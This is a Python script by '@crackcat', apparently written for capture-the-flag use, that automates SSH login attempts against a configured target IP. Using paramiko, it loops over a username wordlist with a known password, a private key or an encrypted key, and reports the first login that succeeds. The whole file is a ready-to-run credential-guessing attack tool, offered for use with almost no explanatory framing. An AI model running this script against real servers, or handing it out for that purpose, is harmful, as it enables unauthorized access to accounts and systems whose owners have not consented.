#!/usr/bin/env python3

# [Description]
#	This script automates SSH authentication to find a valid user for a given password/key

# [Requires]
#       - a valid password and/or a private key

# [Usage]
#	1) update parameters (ip,password)
#	2) run the script with a wordlist as argument

# [Author]
#	@crackcat


import os
import paramiko # http://docs.paramiko.org/en/stable/api/client.html
import sys


ip            = ''  # target
password      = ''  # valid password/passphrase (required the "creds" and "keyenc" mode)

mode          = 'creds'
# creds  : requires a valid password (default)
# key    : requires a path to a valid key
# keyenc : requires a path to a valid key and the password for it

keypath       = ''  # only required for the "key" and "keyenc" mode

port          = 22
tcptimeout    = 6   # seconds


class fc:
        cyan = '\033[96m'
        green = '\033[92m'
        orange = '\033[93m'
        red = '\033[91m'
        end = '\033[0m'
        bold = '\033[1m'


def get_users(file):
        lines = []
        try:
                with open(file, 'r') as list:
                        lines = list.readlines()
        except Exception as e:
                print(f'{fc.red}[+]{fc.end} Failed to get users: {str(e)}')
                sys.exit(1)
        return [line.strip('\n') for line in lines]


def login(client, user, password):
        try:
                if mode == 'creds':
                        client.connect(ip, port, user, password, timeout=tcptimeout)
                elif mode == 'key':
                        client.connect(ip, port, user, key_filename=keypath, timeout=tcptimeout)
                elif mode == 'keyenc':
                        client.connect(ip, port, user, password, key_filename=keypath, timeout=tcptimeout)

                return True
        except paramiko.AuthenticationException:
                return False
        except Exception as e:
                print(f'{fc.red}[+]{fc.end} Failed to connect: {str(e)}')
                sys.exit(1)

def main(wordlist):

        users = get_users(wordlist)
        total = len(users)

        print(f'{fc.green}[+]{fc.end} Configuration:')
        print(f'        [{fc.green}ip{fc.end}          ] {fc.orange}{ip}{fc.end}:{fc.orange}{port}{fc.end}')
        print(f'        [{fc.green}auth mode{fc.end}   ] {fc.orange}{mode}{fc.end}')
        if (mode != 'key'):
                print(f'        [{fc.green}password{fc.end}    ] {fc.orange}{password}{fc.end}')
        if (mode != 'creds'):
                print(f'        [{fc.green}key path{fc.end}    ] {fc.orange}{keypath}{fc.end}')
        print(f'        [{fc.green}user list{fc.end}   ] {fc.orange}{wordlist}{fc.end}')
        print(f'        [{fc.green}tcp timeout{fc.end} ] {fc.orange}{tcptimeout}s{fc.end}')
        print(f'        [{fc.green}total users{fc.end} ] {fc.orange}{total}{fc.end}')

        if len(users) == 0:
                print(f'{fc.orange}[+]{fc.end} No usernames found')
                sys.exit(0)

        print(f'\n{fc.cyan}[+]{fc.end} Attempting login ...')

        n = 0
        for user in users:
                n += 1
                p = n*100.0/total
                # start a new client for every connection to avoid "banner timeout" errors
                with paramiko.SSHClient() as client:
                        client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)

                        print(f'{fc.cyan}[+]{fc.end} [{fc.orange}{p:6.2f}%{fc.end}] Checking user [{fc.cyan}{user.ljust(20)}{fc.end}] ... ',end="")
                        if login(client, user, password):
                                print(f'{fc.green}[LOGIN SUCCESSFUL]{fc.end}',end='')
                                break
                        else:
                                print(f'{fc.red}[not valid]{fc.end}',end='\r')

        print(f'\n{fc.cyan}[+]{fc.end} Finished')

info = f'''

   Automated SSH login script, iterating over usernames with a known password or private key.
   (Became useful in a CTF.)
                                                                                    @crackcat

'''

if __name__ == '__main__':
        print(info)

        if (len(sys.argv) != 2):
                print(f'Usage: {sys.argv[0]} <userlist>')
                sys.exit(0)

        if ((mode == 'key' or mode == 'keyenc') and not os.path.isfile(keypath)):
                print(f'{fc.red}[!]{fc.end} The specified private key does not exist ({fc.cyan}{keypath}{fc.end})')
                sys.exit(0)

        if (mode not in ('creds','key','keyenc')):
                print(f'{fc.red}[!]{fc.end} The specified mode is not valid ({fc.cyan}{mode}{fc.end}). Must be one of: ["creds","key","keyenc"]')
                sys.exit(0)

        if (ip == '' or (mode != 'key' and password == '') or (mode != 'creds' and keypath == '')):
                print(f' {fc.cyan}Don\'t forget to configure the script parameters: {fc.end}')
                print(f'   - [{fc.cyan}ip{fc.end}      ] - target address {fc.red+"(not set)"+fc.end if ip == "" else fc.green+"(set to " + ip + ")"+fc.end}')
                print(f'   - [{fc.cyan}mode{fc.end}    ] - login method {fc.red+"(not set)"+fc.end if mode == "" else fc.green+"(set to " + mode + ")"+fc.end}')
                print(f'                        "{fc.green}creds{fc.end}"  < got a password')
                print(f'                        "{fc.green}key{fc.end}"    < got a private key (no password required)')
                print(f'                        "{fc.green}keyenc{fc.end}" < got an encrypted private key (password required)')
                print(f'   - [{fc.cyan}password{fc.end}] - valid SSH password/passphrase {fc.orange+"(not set)"+fc.end if password == "" else fc.green+"(set to " + password + ")"+fc.end}')
                print(f'   - [{fc.cyan}keypath{fc.end} ] - path to private key {fc.orange+"(not set)"+fc.end if keypath == "" else fc.green+"(set to " + keypath + ")"+fc.end}')
                sys.exit(0)
        main(sys.argv[1])
